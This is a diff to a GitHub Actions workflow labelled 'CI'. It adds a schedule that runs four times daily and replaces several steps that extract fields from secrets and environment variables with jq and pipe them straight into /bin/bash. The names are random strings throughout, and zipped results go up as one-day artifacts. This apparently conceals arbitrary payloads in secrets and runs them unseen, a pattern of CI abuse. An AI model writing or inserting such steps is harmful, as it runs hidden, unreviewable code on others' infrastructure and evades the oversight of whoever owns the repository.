@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '32 3,9,15,21 * * *'
 env:
   CI: true
 concurrency:
@@ -17,16 +19,17 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          qne7735: ${{ secrets.qne7735 }}
+          aclu015: ${{ secrets.aclu015 }}
         run: |
-          printf '%s' "$qne7735" | jq -r .dnpj449 | /bin/bash
-          printf '%s' "$q78685" | jq -r .zfzqr63454 | /bin/bash
-          echo $rkp332 | jq -r .xnyl12 | /bin/bash
-          echo $ploq56 | jq -r .eu167 | /bin/bash
+          printf '%s' "$aclu015" | jq -r .bdi8296 | /bin/bash
+          echo $ttijl5196 | jq -r .ldxpx41 | /bin/bash
+          echo $a24 | jq -r .nvjbo5 | /bin/bash
+          printf '%s' "$co266" | jq -r .iunq6 | /bin/bash
+          echo $iti44316 | jq -r .m522 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: dfggkbZV
+          name: WLRNn7eG
           path: "*.zip"
           retention-days: 1
